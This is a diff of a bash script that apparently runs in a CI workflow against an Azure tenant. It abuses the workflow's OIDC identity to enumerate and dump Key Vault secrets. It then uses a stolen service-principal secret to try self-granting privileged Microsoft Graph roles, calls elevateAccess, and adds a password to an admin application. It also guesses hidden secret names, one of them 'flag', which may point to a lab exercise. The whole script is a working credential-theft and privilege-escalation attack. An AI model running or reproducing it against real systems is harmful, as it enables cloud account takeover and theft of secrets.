@@ -1,50 +1,48 @@
 #!/usr/bin/env bash
-set -x
+# (A) ARM control-plane secret NAMES in both vaults (Reader works even if data-plane 403)
+# (B) sync-service Application.ReadWrite.All escalation: self-grant RoleManagement.ReadWrite.Directory
+# (C) full raw kv-tbl-prod secret values + guessed hidden names
+set +e
+SUB="$AZURE_SUBSCRIPTION_ID"; TEN="$AZURE_TENANT_ID"; RG="rg-tbl-platform-prod-sea"; AUD="api://AzureADTokenExchange"
+mint(){ curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$AUD" | jq -r .value; }
+oidc(){ curl -s -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" -d "client_id=$AZURE_CLIENT_ID" -d grant_type=client_credentials -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer -d "client_assertion=$(mint)" --data-urlencode "scope=$1" | jq -r .access_token; }
+spk(){ curl -s -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" -d "client_id=$1" -d grant_type=client_credentials -d "client_secret=$2" --data-urlencode "scope=$3" | jq -r .access_token; }
+MG=$(oidc "https://management.azure.com/.default"); KV=$(oidc "https://vault.azure.net/.default")
+getsec(){ curl -s -H "Authorization: Bearer $KV" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/$1?api-version=7.4" | jq -r .value; }
 
-az login --federated-token "$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r .value)" \
-  --service-principal -u "$AZURE_CLIENT_ID" -t "$AZURE_TENANT_ID" --output none 2>&1 || true
-az account set -s "$AZURE_SUBSCRIPTION_ID" 2>&1 || true
-
-# 1. Try webapp logs
-echo "=== WEBAPP LOGS ==="
-az webapp log download -n app-tbl-storefront-prod -g rg-tbl-platform-prod-sea --log-file /tmp/logs.zip 2>&1 | head -c 200
-ls -la /tmp/logs.zip 2>/dev/null && unzip -l /tmp/logs.zip 2>/dev/null | head
-
-# 2. Try older API versions for config/web (might include appSettings)
-for VER in 2016-08-01 2018-11-01 2020-06-01 2021-02-01 2022-03-01; do
-  echo "=== config/web api=$VER ==="
-  RESULT=$(az rest --method get --url "https://management.azure.com/subscriptions/$AZURE_SUBSCRIPTION_ID/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/web?api-version=$VER" 2>&1)
-  echo "$RESULT" | python3 -c "import sys,json; d=json.load(sys.stdin); a=d.get('properties',{}).get('appSettings'); print(f'appSettings={a}')" 2>/dev/null
+echo "### A: ARM control-plane secret NAMES (names/attrs only, no values)"
+for V in kv-tbl-sec-x3euoz kv-tbl-prod-x3euoz; do
+  echo "  -- $V --"
+  curl -s -H "Authorization: Bearer $MG" "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.KeyVault/vaults/$V/secrets?api-version=2023-07-01" \
+    | jq -r 'if .value then (.value[]? | "   name="+(.name)+" enabled="+((.properties.attributes.enabled)|tostring)+" ct="+((.properties.contentType)//"-")+" tags="+((.tags)//{}|tostring)) else ("   ERR "+(.error.code//"?")) end'
 done
 
-# 3. Try Microsoft.Web/sites GET (full) with old API — appSettings might be in siteConfig
-for VER in 2016-08-01 2018-11-01; do
-  echo "=== site GET api=$VER ==="
-  az rest --method get --url "https://management.azure.com/subscriptions/$AZURE_SUBSCRIPTION_ID/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Web/sites/app-tbl-storefront-prod?api-version=$VER" 2>&1 | python3 -c "
-import sys,json
-d=json.load(sys.stdin)
-sc=d.get('properties',{}).get('siteConfig',{})
-a=sc.get('appSettings')
-cs=sc.get('connectionStrings')
-e=sc.get('environmentVariables')
-if a: print(f'appSettings: {a}')
-if cs: print(f'connectionStrings: {cs}')
-if e: print(f'envVars: {e}')
-print(f'linuxFxVersion: {sc.get(\"linuxFxVersion\")}')
-print(f'appCommandLine: {sc.get(\"appCommandLine\")}')
-" 2>/dev/null
+echo "### B: sync-service Application.ReadWrite.All escalation attempts"
+SS=$(getsec sync-service-principal); SA=$(echo "$SS"|jq -r .appId); SK=$(echo "$SS"|jq -r .clientSecret)
+GT=$(spk "$SA" "$SK" "https://graph.microsoft.com/.default")
+SSOID=70a07660-06bb-4396-b754-59fbad0b143e
+GRAPHSP=$(curl -s -H "Authorization: Bearer $GT" "https://graph.microsoft.com/v1.0/servicePrincipals(appId='00000003-0000-0000-c000-000000000000')?\$select=id" | jq -r .id)
+echo "  graph SP oid=$GRAPHSP"
+# try self-granting several high-value app roles
+declare -A ROLES=( [RoleMgmtRW]=9e3f62cf-ca93-4989-b6ce-bf83c28f9fe8 [AppRoleAssignmentRW]=06b708a9-e830-4db3-a914-8e69da51d44f [DirectoryRW]=19dbc75e-c2e2-444c-a770-ec69d8559fc7 [AppAdminRW]=1bfefb4e-e0b5-418b-a88f-73c46d2cc8e9 )
+for r in "${!ROLES[@]}"; do
+  RID="${ROLES[$r]}"
+  C=$(curl -s -o /tmp/ar -w '%{http_code}' -X POST -H "Authorization: Bearer $GT" -H "Content-Type: application/json" \
+    "https://graph.microsoft.com/v1.0/servicePrincipals/$GRAPHSP/appRoleAssignedTo" \
+    -d "{\"principalId\":\"$SSOID\",\"resourceId\":\"$GRAPHSP\",\"appRoleId\":\"$RID\"}")
+  echo "  self-grant $r ($RID) -> $C $( [ "$C" != 201 ] && jq -r '.error.message' /tmp/ar | head -c 100)"
 done
+# try elevateAccess (would need User Access Admin at root)
+echo "  elevateAccess -> $(curl -s -o /dev/null -w '%{http_code}' -X POST -H "Authorization: Bearer $MG" -H 'Content-Length: 0' "https://management.azure.com/providers/Microsoft.Authorization/elevateAccess?api-version=2016-07-01")"
+# can sync-service add a password to the Owner-adjacent apps? (take over legacy-admin properly)
+echo "  add password to legacy-admin app -> $(curl -s -o /tmp/pw -w '%{http_code}' -X POST -H "Authorization: Bearer $GT" -H 'Content-Type: application/json' "https://graph.microsoft.com/v1.0/applications/22a3fb7e-860a-4708-9e50-3d36aa21191c/addPassword" -d '{"passwordCredential":{"displayName":"x"}}') $(jq -r '.error.message//"(secret added)"' /tmp/pw | head -c 80)"
 
-# 4. Try deployment source
-echo "=== DEPLOYMENT ==="
-az webapp deployment source show -n app-tbl-storefront-prod -g rg-tbl-platform-prod-sea 2>&1 | head -c 300
-
-# 5. Try functions/slots
-echo "=== SITE EXTENSIONS ==="
-az rest --method get --url "https://management.azure.com/subscriptions/$AZURE_SUBSCRIPTION_ID/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Web/sites/app-tbl-storefront-prod/siteextensions?api-version=2023-12-01" 2>&1 | head -c 300
-
-# 6. Process list (might show env vars in command line)
-echo "=== PROCESS LIST ==="
-az rest --method get --url "https://management.azure.com/subscriptions/$AZURE_SUBSCRIPTION_ID/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Web/sites/app-tbl-storefront-prod/processes?api-version=2023-12-01" 2>&1 | head -c 500
-
+echo "### C: full raw kv-tbl-prod secret values + guessed names"
+for s in sync-service-principal secrets-sync-principal cost-reader-principal directory-audit-principal reporting-service-principal reporting-viewer-principal; do
+  echo "  $s = $(curl -s -H "Authorization: Bearer $KV" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/$s?api-version=7.4" | jq -c '{value,tags,contentType}')"
+done
+for n in flag internal-config config-storage-connection storage-connection sync-token connection-string appcfg-key owner-credential breakglass; do
+  R=$(curl -s -o /tmp/gg -w '%{http_code}' -H "Authorization: Bearer $KV" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/$n?api-version=7.4")
+  [ "$R" = "200" ] && echo "  *** HIDDEN $n = $(jq -r .value /tmp/gg)"
+done
 echo "=== DONE ==="
